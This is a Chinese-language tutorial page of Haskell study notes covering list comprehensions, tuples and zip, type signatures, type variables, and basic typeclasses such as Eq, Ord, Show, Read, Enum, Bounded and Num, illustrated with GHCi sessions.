<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prelude</span>&gt; [x*<span class="number">2</span> | x &lt;- [<span class="number">1.</span><span class="number">.10</span>]]</span><br><span class="line">[<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">16</span>,<span class="number">18</span>,<span class="number">20</span>]</span><br></pre></td></tr></table></figure>
<p>如果只想取乘2以后大于等于12的元素</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prelude</span>&gt; [x*<span class="number">2</span> | x &lt;- [<span class="number">1.</span><span class="number">.10</span>], x*<span class="number">2</span>&gt;=<span class="number">12</span>]</span><br><span class="line">[<span class="number">12</span>,<span class="number">14</span>,<span class="number">16</span>,<span class="number">18</span>,<span class="number">20</span>]</span><br></pre></td></tr></table></figure>
<p>逗号后是<strong>限制条件(predicate)</strong></p>
<p>再考虑50到100中，所有除以7余3的元素</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prelude</span>&gt; [x | x &lt;- [<span class="number">50.</span><span class="number">.100</span>], x `mod` <span class="number">7</span> == <span class="number">3</span>]</span><br><span class="line">[<span class="number">52</span>,<span class="number">59</span>,<span class="number">66</span>,<span class="number">73</span>,<span class="number">80</span>,<span class="number">87</span>,<span class="number">94</span>]</span><br></pre></td></tr></table></figure>
<p>从一个List中筛选出符合特定限制条件的操作也可以称为<strong>过滤(flitering)</strong></p>
<p>再举个例子，把List中所有大于10的奇数变为”BANG”，小于10的奇数变为”BOOM”，其它都扔掉</p>
<p>考虑重用，我们将这个comprehension置于一个函数中</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">boomBans</span> xs = [ <span class="keyword">if</span> x &lt; <span class="number">10</span> <span class="keyword">then</span> <span class="string">"BOOM"</span> <span class="keyword">else</span> <span class="string">"BANG"</span> | x &lt;- xs,odd x]</span><br></pre></td></tr></table></figure>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; boomBans [<span class="number">7.</span><span class="number">.13</span>]</span><br><span class="line">[<span class="string">"BOOM"</span>,<span class="string">"BOOM"</span>,<span class="string">"BANG"</span>,<span class="string">"BANG"</span>]</span><br></pre></td></tr></table></figure>
<p>也可以加多个限制条件，比如获得10到20中所有不等于13,15或19的数</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; [x | x &lt;- [<span class="number">10.</span><span class="number">.20</span>], x/=<span class="number">13</span>, x/=<span class="number">15</span>, x/=<span class="number">19</span>]</span><br><span class="line">[<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">20</span>]</span><br></pre></td></tr></table></figure>
<p>还可以从<strong>多个列表</strong>中取元素，这样comprehension会把所有的元素组合交付给输出函数，在不过滤的前提下，2个长度为4的集合的comprehension会产生一个长度为16的List</p>
<p>比如有两个List，<code>[2,5,10]</code>和<code>[8,10,11]</code>，要取它们所有组合的积</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; [x*y | x &lt;- [<span class="number">2</span>,<span class="number">5</span>,<span class="number">10</span>], y &lt;- [<span class="number">8</span>,<span class="number">10</span>,<span class="number">11</span>]]</span><br><span class="line">[<span class="number">16</span>,<span class="number">20</span>,<span class="number">22</span>,<span class="number">40</span>,<span class="number">50</span>,<span class="number">55</span>,<span class="number">80</span>,<span class="number">100</span>,<span class="number">110</span>]</span><br></pre></td></tr></table></figure>
<p>再取乘积大于50的结果</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; [x*y | x &lt;- [<span class="number">2</span>,<span class="number">5</span>,<span class="number">10</span>], y &lt;- [<span class="number">8</span>,<span class="number">10</span>,<span class="number">11</span>], x*y &gt; <span class="number">50</span>]</span><br><span class="line">[<span class="number">55</span>,<span class="number">80</span>,<span class="number">100</span>,<span class="number">110</span>]</span><br></pre></td></tr></table></figure>
<p>我们取一组名词和形容词的List comprehension，<del>写诗的话可能用得着</del></p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; <span class="keyword">let</span> nouns = [<span class="string">"hobo"</span>,<span class="string">"frog"</span>,<span class="string">"pope"</span>]</span><br><span class="line">*<span class="type">Main</span>&gt; <span class="keyword">let</span> adjectives = [<span class="string">"lazy"</span>,<span class="string">"grouchy"</span>,<span class="string">"scheming"</span>]</span><br><span class="line"></span><br><span class="line">*<span class="type">Main</span>&gt; [adjective ++ <span class="string">" "</span> ++ noun | adjective &lt;- adjectives ,noun &lt;- nouns]</span><br><span class="line">[<span class="string">"lazy hobo"</span>,<span class="string">"lazy frog"</span>,<span class="string">"lazy pope"</span>,<span class="string">"grouchy hobo"</span>,<span class="string">"grouchy frog"</span>,</span><br><span class="line"><span class="string">"grouchy pope"</span>,<span class="string">"scheming hobo"</span>,<span class="string">"scheming frog"</span>,<span class="string">"scheming pope"</span>]</span><br></pre></td></tr></table></figure>
<p>最后再写一个自己的<code>length</code>函数，命名为<code>length&#39;</code></p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">length'</span> xs = sum [<span class="number">1</span> | _ &lt;- xs]</span><br></pre></td></tr></table></figure>
<p>其中<code>_</code>表示我们不关心从List中取什么值，这个函数将List中的所有元素置换为1，并且相加求和</p>
<blockquote>
<p>字符串也是List，完全可以使用list comprehension来处理字符串</p>
</blockquote>
<p>除去字符串中所有非大写字母</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">removeNonUppercase</span> st = [c | c &lt;- st , c `elem` ['<span class="type">A'</span>..'<span class="type">Z'</span>]]</span><br></pre></td></tr></table></figure>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; removeNonUppercase <span class="string">"Hello,World"</span></span><br><span class="line"><span class="string">"HW"</span></span><br></pre></td></tr></table></figure>
<p>其中，限制条件做了所有的工作，只有在<code>[&#39;A&#39;..&#39;Z&#39;]</code>之间的字元才可以被包含</p>
<p>若操作含有List的List，可以嵌套使用list comprehension</p>
<p>在不拆开它的前提下除去其中所有的奇数   </p>
<blockquote>
<p>even 偶数</p>
</blockquote>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; <span class="keyword">let</span> xxs = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">7</span>]]</span><br><span class="line">*<span class="type">Main</span>&gt; [ [ x | x &lt;- xs ,even x] | xs &lt;- xxs ]</span><br><span class="line">[[<span class="number">2</span>,<span class="number">4</span>],[<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>],[<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>]]</span><br></pre></td></tr></table></figure>
<h2 id="Tuple"><a href="#Tuple" class="headerlink" title="Tuple"></a>Tuple</h2><p>如果要表示二维向量，可以使用List，但考虑将一组向量置于一个List中来表示平面图形</p>
<p>类似<code>[[1,2],[8,11],[4,5]]</code>是可以的，但仍有问题：</p>
<p><code>[[1,2],[8,11,5],[4,5]]</code>也是合法的，因为其中元素的型别都相同，这样编译器并不会报错</p>
<p>然而一个长度为2的Tuple(也可以称为Pair)是一个独立的类型，这就意味着一个包含一组序对的List不能再加入一个三元组，所以把原先的<code>[ ]</code> 改为<code>( )</code>会更好 </p>
<p><code>[(1,2),(8,11),(4,5)]</code></p>
<p>如果尝试<code>[(1,2),(2,3,4),(4,4)]</code>就会报错</p>
<blockquote>
<p>使用Tuple前应该明确一条数据中应该有多少个项，每个Tuple都是独立的型别，不能给它追加元素</p>
<p>唯一能做的是给一个List追加序对，三元组等内容</p>
</blockquote>
<p><code>fst</code>返回一个序对的首项，<code>snd</code>返回尾项（不能与应用与三元组等）</p>
<p><strong>zip</strong>函数，可以用于生成一组<code>序对的List</code>，在需要组合或者遍历两个List时很有用</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; zip [<span class="number">1.</span><span class="number">.5</span>]['a'..'e']</span><br><span class="line">[(<span class="number">1</span>,'a'),(<span class="number">2</span>,'b'),(<span class="number">3</span>,'c'),(<span class="number">4</span>,'d'),(<span class="number">5</span>,'e')]</span><br></pre></td></tr></table></figure>
<p>如果两个List不一样长，较长的List会在中间断开</p>
<p>由于haskell是惰性的，因此可以处理有限和无限的List也是可以的</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; zip [<span class="number">1.</span>.]['x'..'z']</span><br><span class="line">[(<span class="number">1</span>,'x'),(<span class="number">2</span>,'y'),(<span class="number">3</span>,'z')]</span><br></pre></td></tr></table></figure>
<p>考虑一个问题，同时应用List和Tuple</p>
<blockquote>
<p>如何取得三边长度皆为整数，且小于等于10</p>
<p>并且周长为24的直角三角形</p>
</blockquote>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; <span class="keyword">let</span> triangles = [ (a,b,c) | c &lt;- [<span class="number">1.</span><span class="number">.10</span>], b &lt;- [<span class="number">1.</span><span class="number">.10</span>], a &lt;- [<span class="number">1.</span><span class="number">.10</span>]]</span><br></pre></td></tr></table></figure>
<p>列出所有三边的可能，再加上直角的条件</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; <span class="keyword">let</span> triangles = [ (a,b,c) | c &lt;- [<span class="number">1.</span><span class="number">.10</span>], b &lt;- [<span class="number">1.</span><span class="number">.10</span>], a &lt;- [<span class="number">1.</span><span class="number">.10</span>], a^<span class="number">2</span> + b^<span class="number">2</span> == c^<span class="number">2</span>] </span><br><span class="line">*<span class="type">Main</span>&gt; triangles </span><br><span class="line">[(<span class="number">4</span>,<span class="number">3</span>,<span class="number">5</span>),(<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>),(<span class="number">8</span>,<span class="number">6</span>,<span class="number">10</span>),(<span class="number">6</span>,<span class="number">8</span>,<span class="number">10</span>)]</span><br></pre></td></tr></table></figure>
<p>这里我们规定$ a&lt;=b&lt;=c $</p>
<p>再加上周长为24的条件</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; <span class="keyword">let</span> triangles = [ (a,b,c) | c &lt;- [<span class="number">1.</span><span class="number">.10</span>], b &lt;- [<span class="number">1.</span>.c], a &lt;- [<span class="number">1.</span>.b], a^<span class="number">2</span> + b^<span class="number">2</span> == c^<span class="number">2</span> , a+b+c == <span class="number">24</span>] </span><br><span class="line">*<span class="type">Main</span>&gt; triangles </span><br><span class="line">[(<span class="number">6</span>,<span class="number">8</span>,<span class="number">10</span>)]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这就是函数式语言的一般思路：先取一个初始的集合并将其变形，执行过滤条件，最后取得正确结果</p>
</blockquote>
<h1 id="类型-amp-类型类"><a href="#类型-amp-类型类" class="headerlink" title="类型&amp;类型类"></a>类型&amp;类型类</h1><h2 id="类型相关"><a href="#类型相关" class="headerlink" title="类型相关"></a>类型相关</h2><p>haskell是静态类型的，也支持类型推导</p>
<p>可以用<code>ghci</code>来检测表达式的类型，用<code>:t</code>命令加任何可用的表达式</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; :t 'a'</span><br><span class="line">'a' :: <span class="type">Char</span></span><br><span class="line">*<span class="type">Main</span>&gt; :t <span class="type">True</span></span><br><span class="line"><span class="type">True</span> :: <span class="type">Bool</span></span><br><span class="line">*<span class="type">Main</span>&gt; :t <span class="string">"Hello"</span></span><br><span class="line"><span class="string">"Hello"</span> :: [<span class="type">Char</span>]</span><br><span class="line">*<span class="type">Main</span>&gt; :t (<span class="type">False</span>,'x')</span><br><span class="line">(<span class="type">False</span>,'x') :: (<span class="type">Bool</span>, <span class="type">Char</span>)</span><br><span class="line">*<span class="type">Main</span>&gt; :t <span class="number">4</span> == <span class="number">5</span></span><br><span class="line"><span class="number">4</span> == <span class="number">5</span> :: <span class="type">Bool</span></span><br></pre></td></tr></table></figure>
<p>可见，<code>:t</code>命令处理表达式的输出结果为：表达式 + <code>::</code> + 其类型，其中<code>::</code>读作<strong>它的类型为</strong></p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">addThree</span> :: <span class="type">Int</span> -&gt; <span class="type">Int</span> -&gt; <span class="type">Int</span> -&gt; <span class="type">Int</span></span><br><span class="line"><span class="title">addThree</span> x y z = x + y + z</span><br></pre></td></tr></table></figure>
<p><code>addThree</code>带有三个整形参数，返回值是整形</p>
<p>前三个表示参数，最后一个表示返回值</p>
<p>同样也可以用<code>:t</code>检测函数类型</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; :t addThree </span><br><span class="line"><span class="title">addThree</span> :: <span class="type">Int</span> -&gt; <span class="type">Int</span> -&gt; <span class="type">Int</span> -&gt; <span class="type">Int</span></span><br></pre></td></tr></table></figure>
<p>Integer`也表示整数，差别在于它是无界的</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">factorial</span> :: <span class="type">Integer</span> -&gt; <span class="type">Integer</span></span><br><span class="line"><span class="title">factorial</span> n = product [<span class="number">1.</span>.n]</span><br></pre></td></tr></table></figure>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; factorial <span class="number">50</span></span><br><span class="line"><span class="number">30414093201713378043612608166064768844377641568960512000000000000</span></span><br></pre></td></tr></table></figure>
<p><strong>类型的首字母必是大写</strong></p>
<p>考虑<code>head</code>函数的类型，它可以取任何List的首项</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; :t head</span><br><span class="line"><span class="title">head</span> :: [a] -&gt; a</span><br></pre></td></tr></table></figure>
<p>a是小写，所以它不是类型，而是<strong>类型变量</strong>，可以是任意的类型，和<strong>泛型(generic)</strong>很相似</p>
<p>使用到类型变量的函数被称作<strong>多态函数</strong></p>
<p>在命名上，类型变量使用多个字符是合法的，不过约定俗成通常都是使用单个字符</p>
<p>再考虑<code>fst</code>函数，取一个包含两个类型的Tuple作为参数，并以第一个项的类型作为返回值</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; :t fst</span><br><span class="line"><span class="title">fst</span> :: (a, b) -&gt; a</span><br><span class="line">*<span class="type">Main</span>&gt;</span><br></pre></td></tr></table></figure>
<p>注意，a和b是不同的类型变量，可以是不同的类型，它只是标明了首项的类型和返回值的类型相同</p>
<h2 id="类型类"><a href="#类型类" class="headerlink" title="类型类"></a>类型类</h2><p>类型定义行为的接口，如果一个类型属于某类型类，那它必实现了该类型类所描述的行为</p>
<p>可以看做是java中接口(interface)的类似物</p>
<p>考虑 == 函数的类型声明</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; :t (==)</span><br><span class="line">(==) :: <span class="type">Eq</span> a =&gt; a -&gt; a -&gt; <span class="type">Bool</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>判断相等的 == 运算符是函数，+-*/之类的运算符也是同样</p>
<p>默认情况下它们多为中缀函数</p>
<p>若要查看它的类型，就必须得用括号使其作为另一个函数，或者说以前缀函数的形式调用它</p>
</blockquote>
<p>这里的<code>=&gt;</code>符号，左边的部分叫做<strong>类型约束</strong></p>
<p>可以这样读<strong>相等函数取两个相同类型的值作为参数并返回一个布尔值，而这两个参数的类型同在Eq类中(即类型约束)</strong></p>
<blockquote>
<p><strong>Eq</strong>这一类型类提供了判断相等性的接口，凡是可比较相等性的类型必属于Eq类</p>
</blockquote>
<p>elem函数类型为<code>(Eq a)=&gt;a-&gt;[a]-&gt;Bool</code></p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; :t elem</span><br><span class="line"><span class="title">elem</span> :: (<span class="type">Eq</span> a, <span class="type">Foldable</span> t) =&gt; a -&gt; t a -&gt; <span class="type">Bool</span></span><br></pre></td></tr></table></figure>
<p>检测值是否存在于一个List时用到了<code>==</code>函数</p>
<h3 id="几个基本的类型类"><a href="#几个基本的类型类" class="headerlink" title="几个基本的类型类"></a>几个基本的类型类</h3><p><strong>Eq</strong></p>
<p><code>Eq</code>包含可判断相等性的类型，提供实现的函数是 <code>==</code> 和<code>/=</code></p>
<p>所以，只要一个函数有Eq类的类型限制，那么它必定在定义中用到了<code>==</code>和<code>/=</code></p>
<p>因为除函数以外的所有类型都属于Eq，所以它们都可判断相等性</p>
<p><strong>Ord</strong></p>
<p><code>Ord</code>包含可比较大小的类型</p>
<p><code>compare</code>函数取两个<code>Ord</code>类中的相同类型的值作为参数，返回比较的结果</p>
<p>其结果是如下三种类型之一： <code>GT LT EQ</code></p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; :t (&gt;)</span><br><span class="line">(&gt;) :: <span class="type">Ord</span> a =&gt; a -&gt; a -&gt; <span class="type">Bool</span></span><br></pre></td></tr></table></figure>
<p>类型若要成为<code>Ord</code>的成员，必先加入Eq家族</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; <span class="string">"hello"</span>&lt;<span class="string">"world"</span></span><br><span class="line"><span class="type">True</span></span><br><span class="line">*<span class="type">Main</span>&gt; <span class="string">"hello"</span> `compare` <span class="string">"world"</span></span><br><span class="line"><span class="type">LT</span></span><br><span class="line">*<span class="type">Main</span>&gt; <span class="number">5</span> &gt;= <span class="number">2</span></span><br><span class="line"><span class="type">True</span></span><br><span class="line">*<span class="type">Main</span>&gt; <span class="number">5</span> `compare` <span class="number">2</span></span><br><span class="line"><span class="type">GT</span></span><br></pre></td></tr></table></figure>
<p><strong>Show</strong></p>
<p><code>Show</code>的成员为<strong>可用字符串表示 的类型</strong></p>
<p>操作Show类型类，最常用的函数是show，它可以取任一Show的成员类型并将其转为字符串</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; show <span class="number">3</span></span><br><span class="line"><span class="string">"3"</span></span><br><span class="line">*<span class="type">Main</span>&gt; show <span class="number">3.14</span></span><br><span class="line"><span class="string">"3.14"</span></span><br><span class="line">*<span class="type">Main</span>&gt; show <span class="type">True</span></span><br><span class="line"><span class="string">"True"</span></span><br></pre></td></tr></table></figure>
<p><strong>Read</strong></p>
<p><code>Read</code>是与<code>Show</code>相反的类型类，它可以将一个字符串转为<code>Read</code>的某成员类型</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; read <span class="string">"True"</span> || <span class="type">False</span></span><br><span class="line"><span class="type">True</span></span><br><span class="line">*<span class="type">Main</span>&gt; read <span class="string">"8.2"</span> + <span class="number">3.8</span></span><br><span class="line"><span class="number">12.0</span></span><br><span class="line">*<span class="type">Main</span>&gt; read <span class="string">"[1,2,3,4]"</span> ++ [<span class="number">3</span>] </span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">3</span>]</span><br></pre></td></tr></table></figure>
<p>尝试<code>read &quot;4&quot;</code>，这里和我本地不太一样</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">ghci</span>&gt; read <span class="string">"4"</span>   </span><br><span class="line">&lt; interactive &gt;:<span class="number">1</span>:<span class="number">0</span>:   </span><br><span class="line">    <span class="type">Ambiguous</span> <span class="class"><span class="keyword">type</span> variable `a' in the constraint:   </span></span><br><span class="line">      `<span class="type">Read</span> a' arising from a use <span class="keyword">of</span> `read' at :<span class="number">1</span>:<span class="number">0</span><span class="number">-7</span>   </span><br><span class="line">    <span class="type">Probable</span> fix: add a <span class="class"><span class="keyword">type</span> signature that fixes these <span class="keyword">type</span> variable(<span class="title">s</span>)</span></span><br></pre></td></tr></table></figure>
<p>ghci说它不清楚我们想要的是什么样的返回值</p>
<p>注意调用read后的部分，ghci通过它来判断类型</p>
<p>这里它只知道我们要的类型属于Read类型类，而不能明确到底是哪个</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; :t read</span><br><span class="line"><span class="title">read</span> :: <span class="type">Read</span> a =&gt; <span class="type">String</span> -&gt; a</span><br></pre></td></tr></table></figure>
<p>它的返回值属于Read类，但我们若用不到这个值，它就永远不会得知该表达式的类型</p>
<p>所以我们需要在一个表达式后加上<code>::</code>的<strong>类型注释</strong>，以<strong>明确其类型</strong>，如下：</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; read <span class="string">"5"</span> :: <span class="type">Int</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line">*<span class="type">Main</span>&gt; read <span class="string">"5"</span> :: <span class="type">Float</span></span><br><span class="line"><span class="number">5.0</span></span><br><span class="line">*<span class="type">Main</span>&gt; read <span class="string">"[1,2,3,4]"</span> :: [<span class="type">Int</span>]</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">*<span class="type">Main</span>&gt; read <span class="string">"(3,'a')"</span> :: (<span class="type">Int</span>,<span class="type">Char</span>)</span><br><span class="line">(<span class="number">3</span>,'a')</span><br></pre></td></tr></table></figure>
<p><strong>Enum</strong></p>
<p><code>Enum</code>的成员都是连续的类型，也就是<strong>可枚举</strong></p>
<p>主要好处在于，我们可以在Range中用到它的成员类型：每个值都有<strong>后继(successer)</strong>和<strong>前驱(predecesor)</strong>，分别可以通过<code>succ</code>和<code>pred</code>函数得到</p>
<p>该类型类包含的类型有：<code>()</code>，<code>Bool</code>，<code>Char</code>，<code>Ordering</code>，<code>Int</code>，<code>Integer</code>，<code>Float</code>和<code>Double</code></p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prelude</span>&gt; ['a'..'e']</span><br><span class="line"><span class="string">"abcde"</span></span><br><span class="line"><span class="type">Prelude</span>&gt; [<span class="type">LT</span> .. <span class="type">GT</span>]</span><br><span class="line">[<span class="type">LT</span>,<span class="type">EQ</span>,<span class="type">GT</span>]</span><br><span class="line"><span class="type">Prelude</span>&gt; [<span class="number">3</span> .. <span class="number">5</span>]</span><br><span class="line">[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="type">Prelude</span>&gt; succ '<span class="type">B'</span></span><br><span class="line">'<span class="type">C'</span></span><br></pre></td></tr></table></figure>
<p><strong>Bounded</strong></p>
<p><code>Bounded</code>的成员都有一个上限和下限</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prelude</span>&gt; minBound :: <span class="type">Int</span></span><br><span class="line"><span class="number">-9223372036854775808</span></span><br><span class="line"><span class="type">Prelude</span>&gt; maxBound :: <span class="type">Int</span></span><br><span class="line"><span class="number">9223372036854775807</span></span><br><span class="line"><span class="type">Prelude</span>&gt; maxBound :: <span class="type">Bool</span></span><br><span class="line"><span class="type">True</span></span><br><span class="line"><span class="type">Prelude</span>&gt; minBound :: <span class="type">Bool</span></span><br><span class="line"><span class="type">False</span></span><br><span class="line"><span class="type">Prelude</span>&gt; minBound :: <span class="type">Char</span></span><br><span class="line">'\<span class="type">NUL'</span></span><br><span class="line"><span class="type">Prelude</span>&gt; maxBound :: <span class="type">Char</span></span><br><span class="line">'\<span class="number">1114111</span>'</span><br></pre></td></tr></table></figure>
<p><code>minBound</code>和<code>maxBound</code>函数的类型都是<code>(Bounded a) =&gt; a</code>，可以认为它们都是<strong>多态常量</strong></p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prelude</span>&gt; :t minBound </span><br><span class="line"><span class="title">minBound</span> :: <span class="type">Bounded</span> a =&gt; a</span><br></pre></td></tr></table></figure>
<p>如果其中的项都属于<code>Bounded</code>类型类，那么该Tuple也属于<code>Bounded</code></p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prelude</span>&gt; maxBound :: (<span class="type">Bool</span>,<span class="type">Int</span>,<span class="type">Char</span>)</span><br><span class="line">(<span class="type">True</span>,<span class="number">9223372036854775807</span>,'\<span class="number">1114111</span>')</span><br></pre></td></tr></table></figure>
<p><strong>Num</strong></p>
<p>表示数字的类型类，它的成员类型都具有数字的特征</p>
<p>检查一个数字的类型：</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prelude</span>&gt; :t <span class="number">20</span></span><br><span class="line"><span class="number">20</span> :: <span class="type">Num</span> a =&gt; a</span><br></pre></td></tr></table></figure>
<p>看起来所有的数字都是多态常量，它可以作为所有<code>Num</code>类型类中的成员类型</p>
<p>检查<code>*</code>运算符的类型，可以发现它可以处理一切数字</p>
